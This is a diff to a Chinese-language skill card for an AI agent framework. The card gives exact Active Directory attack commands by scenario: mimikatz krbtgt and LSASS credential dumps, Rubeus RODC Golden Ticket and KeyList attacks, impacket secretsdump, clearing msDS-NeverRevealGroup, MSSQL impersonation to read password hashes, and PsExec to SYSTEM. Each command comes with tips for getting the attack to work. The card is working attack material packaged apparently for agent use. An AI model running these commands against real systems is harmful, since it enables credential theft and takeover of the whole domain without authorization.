@@ -4,7 +4,7 @@ description: '按攻击场景索引的精确工具命令，含常见错误和修
 whenToUse: '需要某个攻击场景的精确命令（如 dump krbtgt）时'
 metadata: { domain: meta, tier: T1 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：用 skill 工具按名加载本卡。
 
 ## 工具场景精确命令速查
 
@@ -18,7 +18,7 @@ metadata: { domain: meta, tier: T1 }
 ```cmd
 # 在 RODC 的 SYSTEM shell 中执行
 mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_XXXX" "exit"
-```
+```text
 - ✅ 用 `/inject /name:krbtgt_XXXX`（不是 `/patch`）
 - ✅ 输出中包含 `aes256_hmac` 行 → 这是 Golden Ticket 的密钥
 - ❌ `/patch` 只给 NTLM hash，Golden Ticket 需要 AES256
@@ -26,7 +26,7 @@ mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_XXXX" "exit"
 #### 场景：RODC Golden Ticket（Rubeus）
 ```cmd
 Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /aes256:<AES_KEY> /user:Administrator /id:500 /domain:domain.local /sid:<DOMAIN_SID> /outfile:ticket.kirbi
-```
+```text
 - ✅ 用 `/aes256:`（不是 `/rc4:`）
 - ✅ 用 `/flags:forwardable,renewable,enc_pa_rep`
 - ❌ `/rc4:` + 缺少 flags → KDC_ERR_TGT_REVOKED
@@ -34,7 +34,7 @@ Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /aes2
 #### 场景：RODC KeyList Attack（Rubeus）
 ```cmd
 Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/domain.local /dc:DC01.domain.local /ticket:ticket.kirbi /nowrap
-```
+```text
 - ✅ 用 `/enctype:aes256`
 - ✅ 用 `/dc:` 指定可写 DC
 - ✅ 用 `/ticket:` 指向 golden ticket 文件
@@ -43,7 +43,7 @@ Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/domain.local /dc:DC01
 #### 场景：RODC KeyList Attack（impacket，从 Kali 直接）
 ```bash
 impacket-secretsdump -use-keylist -rodcNo 8245 -rodcKey <AES_KEY> domain/Administrator@DC_IP
-```
+```text
 - ✅ 用 AES256 密钥，不是 NTLM
 
 #### 场景：KDC_ERR_TGT_REVOKED
@@ -53,7 +53,7 @@ impacket-secretsdump -use-keylist -rodcNo 8245 -rodcKey <AES_KEY> domain/Adminis
 Get-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=domain,DC=local" -Properties msDS-NeverRevealGroup
 # 清除：
 Set-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=domain,DC=local" -Clear msDS-NeverRevealGroup
-```
+```text
 
 （完整四步链见 rodc-privesc-chain 卡）
 
@@ -73,12 +73,12 @@ EXECUTE AS LOGIN = 'app_user';
 USE AppDatabase;
 SELECT username, password_hash FROM users;
 REVERT;
-```
+```text
 
 #### 场景：识别 Werkzeug PBKDF2 哈希
-```
+```text
 pbkdf2:sha256:600000$salt$hash  → hashcat -m 10900
-```
+```text
 
 （完整链见 mssql-attack-chain 卡）
 
@@ -90,7 +90,7 @@ pbkdf2:sha256:600000$salt$hash  → hashcat -m 10900
 ```cmd
 # 在 DC 的 shell 中
 C:\Windows\Temp\psexec64.exe -accepteula \\<RODC_IP_or_FQDN> -s cmd /c "<command>"
-```
+```text
 - ✅ `-s` = SYSTEM
 - ✅ PsExec 需 ADMIN$ 和 C$ 共享可访问
 
@@ -101,14 +101,14 @@ C:\Windows\Temp\psexec64.exe -accepteula \\<RODC_IP_or_FQDN> -s cmd /c "<command
 #### 场景：需要 AES256 密钥（非 NTLM）
 ```cmd
 mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:<target_user>" "exit"
-```
+```text
 - ✅ `/inject /name:XXX` 给出 AES256
 - ❌ `/patch` 只给 NTLM
 
 #### 场景：从 LSASS dump 所有凭据
 ```cmd
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
-```
+```text
 
 ---
 
